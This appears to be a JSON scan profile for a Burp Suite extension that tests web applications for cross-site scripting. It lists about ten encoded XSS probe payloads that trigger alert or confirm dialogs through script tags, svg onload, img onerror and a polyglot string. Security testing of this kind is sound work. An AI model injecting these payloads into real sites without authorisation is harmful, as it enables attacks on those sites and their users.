[{"Name":"XSSHtmlUrlEncode","Active":false,"Scanner":1,"Author":"@egarme","Payloads":["\u003c/script\u003e\u003cscript\u003econfirm(1)\u003c/script\u003e","\"\u003e\u003cimg src\u003dx onerror\u003dprompt(1);\u003e.","\u003cSCRIPT\u003ea\u003d/XSS/.alert(a.source)\u003c/SCRIPT\u003e","\u003csvg oNLoAd\u003dalert(\u0027XSS\u0027)\u003e","\u003csvg/oNLoAd\u003dalert(1)\u003e","\"\u003e\u003cSCRIPT\u003ea\u003d/XSS/.alert(a.source)\u003c/SCRIPT\u003e\u003c!--","\u003csvg\u003e\u003cscript\u003ealert\u0026#40/1/.source\u0026#41\u003c/script\u003e\u003c/svg\u003e","javascript:/*--\u003e\u003c/title\u003e\u003c/style\u003e\u003c/textarea\u003e\u003c/script\u003e\u003c/xmp\u003e\u003csvg/onload\u003d\u0027+/\"/+/onmouseover\u003d1/+/[*/[]/+alert(11)//\u0027\u003e","\u003csvg \u003c/onload \u003d\"1\u003e (_\u003dalert,\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n_(1337)) \"\"\u003e","\u003cmarquee loop\u003d1 width\u003d0 onfinish\u003dalert(2)\u003e"],"Encoder":["HTML-encode all characters"],"UrlEncode":true,"CharsToUrlEncode":"\u0026;#","Grep":[],"Tags":["XSS"],"PayloadResponse":false,"NotResponse":false,"TimeOut":"","isTime":false,"contentLength":"","iscontentLength":false,"CaseSensitive":false,"ExcludeHTTP":true,"OnlyHTTP":false,"IsContentType":true,"ContentType":"text/html,\n\n\n\n\n\n\n\n application/json","NegativeCT":true,"IsResponseCode":false,"ResponseCode":"","NegativeRC":false,"MatchType":4,"RedirType":4,"MaxRedir":5,"payloadPosition":1,"payloadsFile":"","grepsFile":"","IssueName":"XSSHtmlUrlEncode","IssueSeverity":"High","IssueConfidence":"Certain","IssueDetail":"XSS with payload:   \u003cgrep\u003e","RemediationDetail":"","IssueBackground":"","RemediationBackground":""}]